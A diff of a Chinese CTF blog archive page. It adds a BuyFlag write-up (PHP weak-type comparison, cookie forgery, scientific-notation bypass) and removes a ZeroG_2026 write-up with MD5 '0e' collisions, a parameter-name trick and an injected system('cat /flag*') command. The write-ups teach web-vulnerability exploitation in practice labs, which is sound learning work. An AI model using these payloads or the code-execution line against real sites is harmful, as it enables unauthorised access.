@@ -2041,6 +2041,10 @@
       
         
       
+        
+      
+        
+      
     
     
     
@@ -2548,6 +2552,36 @@
   
   
     <li class="md-nav__item">
+      <a href="../../../../category/web/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
       <a href="../../../../category/git%E6%B3%84%E9%9C%B2/" class="md-nav__link">
         
   
@@ -2586,6 +2620,36 @@
     
   
     phar
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../category/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    代码审计
   
 
     
@@ -3195,6 +3259,209 @@
       <header class="md-typeset">
         <h1 id="2026">2026<a class="headerlink" href="#2026" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-10-31 00:00:00+00:00">2026-10-31</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../../../../category/php/" class="md-meta__link">PHP</a>, 
+              <a href="../../../../category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-meta__link">弱类型</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="2019-buyflag"><a class="toclink" href="../../../../geek2019-buyflag/">[极客大挑战 2019] BuyFlag — 三个小关卡，三种绕过</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：Web — PHP 弱类型 / Cookie 伪造 / 科学计数法</p>
+<p><strong>题目地址</strong>：极客大挑战 2019 BuyFlag（ctf2 复刻环境）</p>
+<p><strong>Flag</strong>：<code>CTF2{439654d3-720c-4ee9-b0f8-9dd67c5b8ab9}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../../../geek2019-buyflag/#_1">题目概述</a></h3>
+<p>一个「买 flag」的页面。要拿到 flag，得同时满足三个条件：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① 密码要对
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>② 必须是 CUIT 的学生
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>③ 钱要够
+</span></code></pre></div>
+<p><strong>三个条件分别对应三种不同的绕过方式 —— 这题的价值就在这儿。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../../../geek2019-buyflag/#_2">解题过程</a></h3>
+<h4 id="step-1-payphp"><a class="toclink" href="../../../../geek2019-buyflag/#step-1-payphp">Step 1：查看源码，发现 pay.php</a></h4>
+<p><strong>查看页面源码，发现存在 <code>pay.php</code>。进去之后继续看源码：</strong></p>
+<p><img alt="pay.php 源码" src="../../../../../assets/images/geek2019-buyflag/01-pay-source.png" /></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">&lt;!--</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">~~~post money and password~~~</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="x">--&gt;</span>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="x">if (isset($_POST['password'])) {</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">    $password = $_POST['password'];</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="x">    if (is_numeric($password)) {</span>
+</span><span id="__span-34-7"><a id="__codelineno-34-7" name="__codelineno-34-7" href="#__codelineno-34-7"></a><span class="x">        echo "password can't be number&lt;/br&gt;";</span>
+</span><span id="__span-34-8"><a id="__codelineno-34-8" name="__codelineno-34-8" href="#__codelineno-34-8"></a><span class="x">    } elseif ($password == 404) {</span>
+</span><span id="__span-34-9"><a id="__codelineno-34-9" name="__codelineno-34-9" href="#__codelineno-34-9"></a><span class="x">        echo "Password Right!&lt;/br&gt;";</span>
+</span><span id="__span-34-10"><a id="__codelineno-34-10" name="__codelineno-34-10" href="#__codelineno-34-10"></a><span class="x">    }</span>
+</span><span id="__span-34-11"><a id="__codelineno-34-11" name="__codelineno-34-11" href="#__codelineno-34-11"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>第一个条件：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>· 不能是纯数字              → is_numeric 挡住 "404"
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>· 但要松散等于 404          → $password == 404
+</span></code></pre></div>
+<p><strong>看起来矛盾，其实不矛盾 —— 因为 <code>is_numeric</code> 看的是“整个字符串是不是数字”，<code>==</code> 看的是“转换成数字后等不等”。</strong></p>
+<p><strong>payload：<code>404a</code></strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>is_numeric("404a")  →  false     ✅ 过第一关
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>"404a" == 404       →  PHP 7 把开头的数字部分转成 404 → true   ✅ 过第二关
+</span></code></pre></div>
+<p><strong>⚠️ 这条只在 PHP 7 成立。PHP 8 改了比较规则（数字与非数字字符串比较时按字符串比），<code>"404a" == 404</code> 会变成 false。</strong></p>
+<h4 id="step-2-cuit"><a class="toclink" href="../../../../geek2019-buyflag/#step-2-cuit">Step 2：提示「必须是 CUIT 的学生」</a></h4>
+<p><strong>发包后页面说：</strong></p>
+<p><img alt="only CUIT" src="../../../../../assets/images/geek2019-buyflag/02-cuit-only.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>Only Cuit's students can buy the FLAG
+</span></code></pre></div>
+<p><strong>先想一个问题：服务端凭什么知道我是谁？</strong></p>
+<p><strong>看请求头 —— 里面有个 <code>Cookie: user=0</code>。</strong></p>
+<p><strong>身份就是它判的，而它是</strong>我们自己的<strong>。改成 <code>user=1</code> 就行。</strong></p>
+<p><strong>这类「把身份放在客户端」的题，判断依据永远是那句：</strong>服务端相信了客户端送来的、可以随便改的东西<strong>。</strong></p>
+<h4 id="step-3-money"><a class="toclink" href="../../../../geek2019-buyflag/#step-3-money">Step 3：还有 money</a></h4>
+<p><strong>再往后看，还差钱：</strong></p>
+<p><img alt="flag need money" src="../../../../../assets/images/geek2019-buyflag/03-money-hint.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>Flag need your 100000000 money
+</span></code></pre></div>
+<p><strong>于是请求体里补一个 <code>money</code> 参数。</strong></p>
+<p><strong>但直接写 <code>money=100000000</code> 会被挡 —— 提示「数字太长了」（源码里有长度限制）。</strong></p>
+<p><strong>解法是</strong>科学计数法<strong>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>money=10e8
+</span></code></pre></div>
+<p><strong><code>10e8</code> 只有 4 个字符，但它的值是 <code>10 × 10^8 = 10^9</code>，足够达到 100000000 的门槛。</strong></p>
+<p><strong>这就是「</strong>字符串长度<strong>和</strong>数值大小<strong>是两回事」的利用点 —— 和第一关的 <code>404a</code> 是同一个套路：</strong>检查看的是一种东西，使用时是另一种东西<strong>。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../../../geek2019-buyflag/#step-4">Step 4：三个条件一起满足</a></h4>
+<p><img alt="请求" src="../../../../../assets/images/geek2019-buyflag/04-request-404a.png" /></p>
+<div class="language-http highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="nf">POST</span> <span class="nn">/pay.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="na">Cookie</span><span class="o">:</span> <span class="l">user=1</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="nt">password</span><span class="o">=</span><span class="s">404a</span><span class="p">&amp;</span><span class="nt">money</span><span class="o">=</span><span class="s">10e8</span>
+</span></code></pre></div>
+<p><strong>响应里就出 flag 了：</strong></p>
+<p><img alt="flag" src="../../../../../assets/images/geek2019-buyflag/05-flag.png" /></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>you are Cuiter
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>Password Right!
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>CTF2{439654d3-720c-4ee9-b0f8-9dd67c5b8ab9}
+</span></code></pre></div>
+<hr />
+<h3 id="_3"><a class="toclink" href="../../../../geek2019-buyflag/#_3">解题思路总结</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>查看源码 → 发现 pay.php → 读它的判断逻辑
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>  → ① 密码：不能是数字，又要 == 404
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>        → is_numeric 与 == 看到的不是同一个东西 → 404a
+</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a>    ② 身份：Cookie: user=0 → 改成 1（客户端说了算）
+</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a>    ③ 钱：要 100000000 但长度受限 → 科学计数法 10e8
+</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a>      三个条件一起发 → flag
+</span></code></pre></div>
+<h4 id="_4"><a class="toclink" href="../../../../geek2019-buyflag/#_4">漏洞原理</a></h4>
+<p><strong>这题三个关卡，本质是</strong>同一件事的三次重复<strong>：</strong></p>
+<table>
+<thead>
+<tr>
+<th>关卡</th>
+<th>检查看的是</th>
+<th>实际用的是</th>
+<th>差异点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>密码</td>
+<td><code>is_numeric</code> 判断“整体是否数字”</td>
+<td><code>==</code> 做数值转换</td>
+<td><code>404a</code> 整体不是数字，但转换后是 404</td>
+</tr>
+<tr>
+<td>身份</td>
+<td>服务端相信 Cookie</td>
+<td>请求里的 <code>user</code></td>
+<td>客户端可控</td>
+</tr>
+<tr>
+<td>钱</td>
+<td><code>strlen</code> 判断字符串长度</td>
+<td>数值比较</td>
+<td><code>10e8</code> 短但大</td>
+</tr>
+</tbody>
+</table>
+<p><strong>三条合起来就是一句：</strong>校验函数和使用点读的不是同一个东西，而你能控制中间那个“东西”。**</p>
+<h4 id="_5"><a class="toclink" href="../../../../geek2019-buyflag/#_5">关键知识点</a></h4>
+<table>
+<thead>
+<tr>
+<th>知识点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>is_numeric('404a')</code></td>
+<td>false —— 只认完整数字</td>
+</tr>
+<tr>
+<td><code>'404a' == 404</code></td>
+<td><strong>PHP 7</strong> 为 true（取前导数字）；<strong>PHP 8 为 false</strong></td>
+</tr>
+<tr>
+<td>PHP 8 比较规则变化</td>
+<td>数字 vs 非数字字符串 → 按字符串比较，弱类型绕过大量失效</td>
+</tr>
+<tr>
+<td>Cookie 伪造</td>
+<td>身份标识存在客户端 → 直接改</td>
+</tr>
+<tr>
+<td>科学计数法</td>
+<td><code>10e8</code> = 1e9，字符短、数值大</td>
+</tr>
+<tr>
+<td><code>strlen</code> vs 数值</td>
+<td>长度检查挡不住科学计数法</td>
+</tr>
+<tr>
+<td>通用模型</td>
+<td>检查点看到的类型/值与使用点看到的不同</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>pay.php 关键判断（按截图整理）</summary>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="x">if (isset($_POST['password'])) {</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="x">    $password = $_POST['password'];</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="x">    if (is_numeric($password)) {</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="x">        echo "password can't be number&lt;/br&gt;";</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="x">    } elseif ($password == 404) {</span>
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="x">        echo "Password Right!&lt;/br&gt;";</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="x">    }</span>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="x">}</span>
+</span></code></pre></div>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5267,136 +5534,6 @@
 <p><strong><code>/</code> 是 Linux 文件系统的根，</strong>不是网站的根<strong>。网站目录一般是 <code>/var/www/html</code> 之类，而 <code>cat</code> 不给路径时用的是</strong>当前工作目录<strong>（cwd）—— 从 <code>ls</code> 的结果看，cwd 就是网站目录，所以相对路径能命中。</strong></p>
 <p><strong>而且 <code>cat /index.php</code> 报的 <code>No such file or directory</code> 走的是 <strong>stderr</strong>，<code>system()</code> 只回显 stdout，所以页面看起来就是「什么都没发生」。</strong></p>
 <p><strong>用 <code>cat /index.php 2&gt;&amp;1</code> 才能看见那条错误。</strong></p>
-    
-    
-  </div>
-</article>
-      
-        <article class="md-post md-post--excerpt">
-  <header class="md-post__header">
-    
-    <div class="md-post__meta md-meta">
-      <ul class="md-meta__list">
-        <li class="md-meta__item">
-          <time datetime="2026-10-28 00:00:00+00:00">2026-10-28</time></li>
-        
-          <li class="md-meta__item">
-            分类于
-            
-              <a href="../../../../category/rce/" class="md-meta__link">RCE</a>, 
-              <a href="../../../../category/%E5%BC%B1%E7%B1%BB%E5%9E%8B/" class="md-meta__link">弱类型</a>, 
-              <a href="../../../../category/php-%E6%BA%90%E7%A0%81/" class="md-meta__link">PHP 源码</a></li>
-        
-        
-          
-          <li class="md-meta__item">
-            
-              需要 2 分钟阅读时间
-            
-          </li>
-        
-        
-      </ul>
-      
-    </div>
-  </header>
-  <div class="md-post__content md-typeset">
-    <h2 id="zerog_2026stage-2"><a class="toclink" href="../../../../zerog2026-stage2/">ZeroG_2026（Stage 2）</a></h2>
-<p>三层，一层比一层贴源码。</p>
-<p><img alt="源码" src="../../../../../assets/images/zerog2026-stage2/01-source.png" /></p>
-<h3 id="_1"><a class="toclink" href="../../../../zerog2026-stage2/#_1">第一层：正则 + 严格不等</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="x">if (isset($_GET['zero'])</span>
-</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="x">    &amp;&amp; preg_match('/^ZeroG 2026!$/', $_GET['zero'])</span>
-</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="x">    &amp;&amp; $_GET['zero'] !== 'ZeroG 2026!') {</span>
-</span></code></pre></div>
-<p>审计代码第一层：正则里的 <code>^</code> 意味着从第一个字符就要匹配，<code>$</code> 意味着到这里就要终止，所以原字符串要是 <code>ZeroG 2026!</code>，但是后面又要 <code>!==</code>（严格不等）。</p>
-<p>这里补充 PCRE 的 <code>$</code>：<strong>它除了匹配字符串末尾，还可以匹配"末尾换行之前"</strong>，所以在末尾加上 <code>\n</code> 也可以，这样就绕过了第一层。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>?zero=ZeroG%202026!%0A
-</span></code></pre></div>
-<h3 id="intval"><a class="toclink" href="../../../../zerog2026-stage2/#intval">第二层：intval 和算术运算用两套规则</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="x">if (intval($_GET['xp']) &lt; 2026 &amp;&amp; intval($_GET['xp'] + 4) &gt; 2030) {</span>
-</span></code></pre></div>
-<p>这里用到了 <code>intval</code>，就系统去补充了一下相关知识：</p>
-<table>
-<thead>
-<tr>
-<th>行为</th>
-<th>例子</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>截断小数点</td>
-<td><code>intval(0.9) = 0</code></td>
-</tr>
-<tr>
-<td>只取前导数字</td>
-<td><code>intval("123abc") = 123</code></td>
-</tr>
-<tr>
-<td><strong>反过来不行</strong></td>
-<td><code>intval("abc123") = 0</code>（不是 123）</td>
-</tr>
-<tr>
-<td>带进制参数 <code>intval($a, $b)</code></td>
-<td><code>$b = 0</code> 时看前缀：<code>0</code> 开头按 8 进制、<code>0x</code> 开头按 16 进制，否则按 10 进制</td>
-</tr>
-</tbody>
-</table>
-<p>接着看到这里：<strong>既要小于 2026，又要加 4 之后大于 2030。</strong></p>
-<p>最开始想的是用字符串改小进制，但这里不行。所以想到用 <code>2025e9</code>：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>intval('2025e9')  = 2025            ← 遇到 e 就直接停了
-</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>'2025e9' + 4      = 2.025e12        ← 2025×10⁹，算术运算先算完，才交给 intval
-</span></code></pre></div>
-<p><strong>同一个字符串，被两套规则解释：<code>intval()</code> 只认前导整数，算术运算认科学计数法。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>?zero=ZeroG%202026!%0A&amp;xp=2025e9
-</span></code></pre></div>
-<h3 id="_2"><a class="toclink" href="../../../../zerog2026-stage2/#_2">第三层：弱等于模拟强等于 + 一个 <code>[</code> 的妙用</a></h3>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="x">if (isset($_POST['Welcome__ctf.2026']) &amp;&amp; isset($_POST['mm'])) {</span>
-</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="x">    $a = $_POST['Welcome__ctf.2026'];</span>
-</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="x">    $b = $_POST['mm'];</span>
-</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a><span class="x">    if ($a !== $b &amp;&amp; md5($a) == md5($b)) {</span>
-</span></code></pre></div>
-<p><strong>用 <code>==</code>（弱等于）去模拟 <code>!==</code>（强不等）：</strong> 找一组 MD5 值都以 <code>0e</code> 开头的数据：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>QNKCDZO   → md5 = 0e830400451993494058024219903391
-</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>240610708 → md5 = 0e462097431906509019562562988736854
-</span></code></pre></div>
-<p><strong>两个 <code>0e...</code> 在 <code>==</code> 下都被当成 0 × 10ⁿ = 0，所以相等；但原字符串不同，<code>!==</code> 也成立。</strong></p>
-<p>接着构造：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>Welcome__ctf.2026=QNKCDZO&amp;mm=240610708&amp;code=system('cat /flag*');
-</span></code></pre></div>
-<p><strong>当然没有这么简单 —— 因为 PHP 会把参数名里的 <code>.</code> 转换成 <code>_</code>，所以这个名字根本出不来。</strong></p>
-<p>我也卡在这里很久。</p>
-<h4 id="_3"><a class="toclink" href="../../../../zerog2026-stage2/#_3">最后发现的东西</a></h4>
-<p>PHP 7.4 的源码逻辑：循环转换 <code>.</code> 和空格，<strong>但是遇到 <code>[</code> 会直接把它替换成 <code>\0</code>（字符串截断符），然后跳出循环</strong>：</p>
-<p><img alt="循环逻辑" src="../../../../../assets/images/zerog2026-stage2/02-loop.png" /></p>
-<p>跳出循环之后，PHP 认为这是数组语法，会去寻找与之配对的 <code>]</code> —— <strong>但是找不到！</strong></p>
-<p>找不到之后，又会把刚刚的 <code>\0</code> 换回 <code>_</code>，恢复完整字符串：</p>
-<p><img alt="找不到配对的右括号之后的恢复" src="../../../../../assets/images/zerog2026-stage2/03-restore.png" /></p>
-<p><strong>所以只要把其中一个 <code>_</code> 改成 <code>[</code>，就能让结果刚好等于原来的名字：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>Welcome__ctf.2026   →  循环走完全程 → 点被转 → Welcome__ctf_2026   ✗
-</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>Welcome_[ctf.2026   →  在 [ 处 break → 点没被处理 → 恢复 [ 为 _ → Welcome__ctf.2026   ✓
-</span></code></pre></div>
-<p><strong>一个字符同时做了两件事：截断循环（让点逃过转换）+ 恢复之后补回那个下划线。</strong></p>
-<p>最终 payload：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>Welcome_[ctf.2026=QNKCDZO&amp;mm=240610708&amp;code=system('cat /flag*');
-</span></code></pre></div>
-<p>拿到 flag。</p>
-<h4 id="cat-flag-cat-flag"><a class="toclink" href="../../../../zerog2026-stage2/#cat-flag-cat-flag"><code>cat /flag*</code> 和 <code>cat flag*</code> 的区别</a></h4>
-<p><strong>这里试了一下：<code>cat flag*</code> 抓不到，<code>cat /flag*</code> 才能抓到。</strong></p>
-<p><strong>原因是</strong>当前工作目录<strong>。web 进程的 cwd 是网站目录（<code>/var/www/html</code> 之类），而 flag 文件在</strong>根目录 <code>/</code><strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>cat flag*     ← 相对路径，在网站目录里找 → 找不到
-</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a>cat /flag*    ← 绝对路径，从根目录找     → 命中
-</span></code></pre></div>
-<p><strong>同一类问题在上一道题里是反过来的：那次 <code>cat /index.php</code> 失败、<code>cat index.php</code> 成功，因为文件就在 cwd 里。</strong></p>
-<p><strong>所以路径没有好坏，只有</strong>对不对得上文件所在的位置<strong>。</strong></p>
-<h3 id="_4"><a class="toclink" href="../../../../zerog2026-stage2/#_4">一个版本细节</a></h3>
-<p><strong><code>intval('2025e9')</code> 只在 <strong>PHP 5</strong> 上返回 2025。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>PHP 5:   intval('2025e9') = 2025            ← 遇到 e 就停
-</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a>PHP 7.1: intval('2025e9') = 2025000000000   ← 也认科学计数法了
-</span></code></pre></div>
-<p><strong>我在本地 PHP 7.4 上实测确认过：<code>intval('2025e9')</code> 返回 <code>2025000000000</code>，第一个条件就直接不成立。</strong></p>
-<p><strong>所以这一关只在 PHP 5 的老环境上成立 —— 换个环境，同一个 payload 就废了。</strong></p>
     
     
   </div>
